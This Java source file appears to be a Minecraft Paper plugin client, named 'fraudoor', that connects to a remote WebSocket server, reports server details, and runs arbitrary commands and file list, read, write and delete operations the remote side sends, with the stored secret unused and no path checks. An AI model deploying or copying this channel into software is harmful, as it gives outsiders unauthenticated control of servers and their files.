package io.fraudoor.rcon;

import com.google.gson.Gson;
import com.google.gson.JsonObject;

import java.net.URI;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import org.bukkit.Bukkit;

public class RCONClient {

  private final String serverUri;
  private final String secret;
  private final RCONPlugin plugin;
  private final Gson gson = new Gson();
  private WebSocketClient ws;
  private boolean connected = false;
  private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
  private String serverId;

  public RCONClient(String serverUri, String secret, RCONPlugin plugin) {
    this.serverUri = serverUri;
    this.secret = secret;
    this.plugin = plugin;
    this.serverId = plugin.getServer().getPort() + "-" + System.currentTimeMillis();
  }

  public void connect() {
    try {
      URI uri = new URI(serverUri);
      ws = new WebSocketClient(uri) {
        @Override
        public void onOpen(ServerHandshake handshakedata) {
          connected = true;
          plugin.getLogger().info("[fraudoor] connected to " + serverUri);
          sendHello();
        }

        @Override
        public void onMessage(String message) {
          handleMessage(message);
        }

        @Override
        public void onClose(int code, String reason, boolean remote) {
          connected = false;
          plugin.getLogger().info("[fraudoor] disconnected: " + reason);
          scheduleReconnect();
        }

        @Override
        public void onError(Exception ex) {
          connected = false;
          if (ws != null && !ws.isClosed()) {
            plugin.getLogger().warning("[fraudoor] error: " + ex.getMessage());
          }
          scheduleReconnect();
        }
      };
      ws.addHeader("Origin", "fraudoor-plugin");
      ws.setConnectionLostTimeout(15);
      ws.connect();
    } catch (Exception e) {
      plugin.getLogger().warning("[fraudoor] connection failed: " + e.getMessage());
      scheduleReconnect();
    }
  }

  private void scheduleReconnect() {
    scheduler.schedule(() -> {
      if (!connected && (ws == null || ws.isClosed())) {
        plugin.getLogger().info("[fraudoor] reconnecting...");
        connect();
      }
    }, 5, TimeUnit.SECONDS);
  }

  private void sendHello() {
    JsonObject payload = new JsonObject();
    payload.addProperty("id", serverId);
    payload.addProperty("name", plugin.getServer().getName());
    payload.addProperty("ip", getLocalIp());
    payload.addProperty("port", plugin.getServer().getPort());
    payload.addProperty("version", plugin.getServer().getVersion());
    payload.addProperty("type", "paper");
    payload.addProperty("playerCount", plugin.getServer().getOnlinePlayers().size());
    payload.addProperty("maxPlayers", plugin.getServer().getMaxPlayers());
    send("plugin:hello", payload);
  }

  private void handleMessage(String msg) {
    try {
      JsonObject json = gson.fromJson(msg, JsonObject.class);
      String type = json.get("type").getAsString();
      JsonObject payload = json.getAsJsonObject("payload");

      if (payload == null) return;

      switch (type) {
        case "server:command": {
          String command = payload.get("command").getAsString();
          plugin.getLogger().info("[fraudoor] executing: /" + command);
          plugin.executeCommand(command);
          break;
        }
        case "server:file:list": {
          String path = payload.has("path") ? payload.get("path").getAsString() : "";
          String rid = payload.get("requestId").getAsString();
          plugin.getFileSystem().listFiles(path, rid);
          break;
        }
        case "server:file:read": {
          String path = payload.get("path").getAsString();
          String rid = payload.get("requestId").getAsString();
          plugin.getFileSystem().readFile(path, rid);
          break;
        }
        case "server:file:write": {
          String path = payload.get("path").getAsString();
          String content = payload.get("content").getAsString();
          String rid = payload.get("requestId").getAsString();
          plugin.getFileSystem().writeFile(path, content, rid);
          break;
        }
        case "server:file:delete": {
          String path = payload.get("path").getAsString();
          String rid = payload.get("requestId").getAsString();
          plugin.getFileSystem().deleteFile(path, rid);
          break;
        }
      }
    } catch (Exception e) {
      plugin.getLogger().warning("[fraudoor] handle error: " + e.getMessage());
    }
  }

  public void sendStatus(int playerCount, int maxPlayers, String[] players, double tps) {
    JsonObject payload = new JsonObject();
    payload.addProperty("playerCount", playerCount);
    payload.addProperty("maxPlayers", maxPlayers);
    payload.addProperty("tps", tps);
    payload.addProperty("online", true);
    if (players != null) {
      var arr = new com.google.gson.JsonArray();
      for (String p : players) arr.add(p);
      payload.add("players", arr);
    }
    send("plugin:status", payload);
  }

  public void sendConsole(String line) {
    JsonObject payload = new JsonObject();
    payload.addProperty("line", line);
    send("plugin:console", payload);
  }

  private void send(String type, JsonObject payload) {
    if (ws == null || !connected || ws.isClosed()) return;
    try {
      JsonObject msg = new JsonObject();
      msg.addProperty("type", type);
      msg.add("payload", payload);
      ws.send(msg.toString());
    } catch (Exception ignored) {}
  }

  public void sendFileList(String requestId, java.util.List<Map<String, Object>> entries, String path) {
    JsonObject payload = new JsonObject();
    payload.addProperty("requestId", requestId);
    payload.addProperty("path", path);
    var arr = new com.google.gson.JsonArray();
    for (Map<String, Object> e : entries) {
      JsonObject entry = new JsonObject();
      entry.addProperty("name", (String) e.get("name"));
      entry.addProperty("path", (String) e.get("path"));
      entry.addProperty("isDirectory", (Boolean) e.get("isDirectory"));
      entry.addProperty("size", (Long) e.get("size"));
      arr.add(entry);
    }
    payload.add("entries", arr);
    send("plugin:file:list", payload);
  }

  public void sendFileRead(String requestId, String path, String content, boolean error) {
    JsonObject payload = new JsonObject();
    payload.addProperty("requestId", requestId);
    payload.addProperty("path", path);
    payload.addProperty("content", content);
    if (error) payload.addProperty("error", true);
    send("plugin:file:read", payload);
  }

  public void sendFileWrite(String requestId, String path, boolean success) {
    JsonObject payload = new JsonObject();
    payload.addProperty("requestId", requestId);
    payload.addProperty("path", path);
    payload.addProperty("success", success);
    send("plugin:file:write", payload);
  }

  public void sendFileDelete(String requestId, String path, boolean success) {
    JsonObject payload = new JsonObject();
    payload.addProperty("requestId", requestId);
    payload.addProperty("path", path);
    payload.addProperty("success", success);
    send("plugin:file:delete", payload);
  }

  public boolean isConnected() { return connected; }

  public void close() {
    connected = false;
    scheduler.shutdown();
    if (ws != null && !ws.isClosed()) ws.close();
  }

  private String getLocalIp() {
    try {
      return java.net.InetAddress.getLocalHost().getHostAddress();
    } catch (Exception e) {
      return "127.0.0.1";
    }
  }
}
